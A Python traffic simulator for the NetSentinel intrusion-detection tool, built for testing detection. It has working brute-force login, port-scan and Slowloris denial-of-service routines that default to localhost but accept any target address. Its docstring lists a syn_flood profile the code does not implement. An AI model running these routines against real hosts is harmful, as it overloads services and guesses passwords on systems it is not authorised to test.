#!/usr/bin/env python3
"""
scripts/simulate_attack.py

Live Attack Traffic Simulator for NetSentinel.
Safely generates realistic attack traffic on local interfaces so you can monitor
live detection, threat scoring, and alerts in the NetSentinel Web Dashboard or CLI.

Supported Attack Profiles:
- brute_force (Default): Rapid authentication attempts with TCP resets (SO_LINGER)
- port_scan: Fast port sweep across sequential/randomized destination ports
- syn_flood: Rapid connection attempt bursts
- slowloris: Low-and-slow HTTP partial header holding

Usage:
  python3 scripts/simulate_attack.py --attack brute_force
  python3 scripts/simulate_attack.py --attack brute_force --target 127.0.0.1 --port 9999 --count 100
"""

import argparse
import socket
import struct
import sys
import threading
import time

def start_mock_auth_server(host: str, port: int, stop_event: threading.Event):
    """Spawns a mock authentication server that responds with HTTP 401 Unauthorized."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((host, port))
        srv.listen(128)
        srv.settimeout(0.5)
    except Exception as exc:
        print(f"[-] Could not bind mock server on {host}:{port}: {exc}")
        return

    while not stop_event.is_set():
        try:
            conn, _ = srv.accept()
            conn.settimeout(0.5)
            try:
                _ = conn.recv(1024)
                response = (
                    b"HTTP/1.1 401 Unauthorized\r\n"
                    b"Content-Type: text/plain\r\n"
                    b"Content-Length: 20\r\n"
                    b"Connection: close\r\n\r\n"
                    b"Invalid credentials\n"
                )
                conn.sendall(response)
            except Exception:
                pass
            finally:
                conn.close()
        except socket.timeout:
            continue
        except Exception:
            break
    srv.close()

def simulate_brute_force(host: str, port: int, count: int, delay: float):
    """Simulates credential brute-forcing with TCP resets."""
    print(f"\n[*] Starting Brute Force simulation against {host}:{port}")
    print(f"[*] Sending {count} credential guessing bursts (delay={delay*1000:.0f}ms per attempt)...")
    print("[*] Watch the NetSentinel Dashboard table and threat gauges!\n")

    passwords = ["admin", "root", "123456", "password", "toor", "guest", "qwerty", "letmein", "master"]

    successes = 0
    t0 = time.time()
    for i in range(1, count + 1):
        pwd = passwords[(i - 1) % len(passwords)]
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            # Configure SO_LINGER to trigger TCP RST on close (classic brute-force / port probe signature)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
            s.connect((host, port))

            payload = (
                f"POST /login HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(pwd) + 15}\r\n\r\n"
                f"user=admin&pass={pwd}\n"
            ).encode("utf-8")
            s.sendall(payload)
            try:
                _ = s.recv(512)
            except Exception:
                pass
            s.close()
            successes += 1
            if i % 10 == 0 or i == count:
                print(f" -> Sent {i}/{count} brute force auth attempts (password='{pwd}') [RST sent]")
        except Exception as exc:
            if i % 10 == 0 or i == count:
                print(f" -> Sent {i}/{count} probe attempts: {exc}")

        if delay > 0:
            time.sleep(delay)

    elapsed = time.time() - t0
    rate = successes / max(elapsed, 0.001)
    print(f"\n[+] Brute force simulation completed: {successes} attempts in {elapsed:.2f}s ({rate:.1f} req/s).")

def simulate_port_scan(host: str, start_port: int, count: int, delay: float):
    """Simulates TCP port sweep across sequential ports."""
    print(f"\n[*] Starting Port Scan simulation against {host} (ports {start_port} to {start_port + count - 1})...")
    scanned = 0
    t0 = time.time()
    for p in range(start_port, start_port + count):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        try:
            s.connect((host, p))
            s.close()
        except Exception:
            pass
        scanned += 1
        if scanned % 10 == 0:
            print(f" -> Probed {scanned}/{count} ports (current: {p})")
        if delay > 0:
            time.sleep(delay)
    elapsed = time.time() - t0
    print(f"\n[+] Port scan simulation completed: {scanned} ports probed in {elapsed:.2f}s.")

def simulate_slowloris(host: str, port: int, sockets_count: int, duration_sec: int):
    """Simulates Slowloris connection holding."""
    print(f"\n[*] Starting Slowloris simulation against {host}:{port} ({sockets_count} holding sockets for {duration_sec}s)...")
    sockets_list = []
    for i in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((host, port))
            s.send(f"GET /?{i} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n".encode("utf-8"))
            sockets_list.append(s)
        except Exception:
            pass
    print(f"[+] Established {len(sockets_list)} slow sockets. Sending periodic keepalive bytes...")
    t_end = time.time() + duration_sec
    while time.time() < t_end:
        for s in list(sockets_list):
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                sockets_list.remove(s)
        time.sleep(5.0)
    for s in sockets_list:
        try:
            s.close()
        except Exception:
            pass
    print(f"[+] Slowloris simulation finished.")

def main():
    parser = argparse.ArgumentParser(description="NetSentinel Live Attack Simulator")
    parser.add_argument("--attack", choices=["brute_force", "port_scan", "slowloris"], default="brute_force", help="Attack profile to simulate")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=9999, help="Target port (default: 9999)")
    parser.add_argument("--count", type=int, default=80, help="Number of attempts/probes to execute (default: 80)")
    parser.add_argument("--delay", type=float, default=0.04, help="Delay between attempts in seconds (default: 0.04s)")
    parser.add_argument("--slowloris-duration", type=int, default=15, help="Slowloris duration in seconds (default: 15)")
    args = parser.parse_args()

    stop_server = threading.Event()
    server_thread = None

    # For brute force and slowloris, if targeting local machine, spawn the mock responder
    if args.attack in ("brute_force", "slowloris") and args.target in ("127.0.0.1", "localhost", "0.0.0.0"):
        server_thread = threading.Thread(
            target=start_mock_auth_server,
            args=("127.0.0.1", args.port, stop_server),
            daemon=True
        )
        server_thread.start()
        time.sleep(0.2)

    try:
        if args.attack == "brute_force":
            simulate_brute_force(args.target, args.port, args.count, args.delay)
        elif args.attack == "port_scan":
            simulate_port_scan(args.target, args.port, args.count, args.delay)
        elif args.attack == "slowloris":
            simulate_slowloris(args.target, args.port, args.count, args.slowloris_duration)
    finally:
        if server_thread:
            stop_server.set()
            server_thread.join(timeout=1.0)

if __name__ == "__main__":
    main()
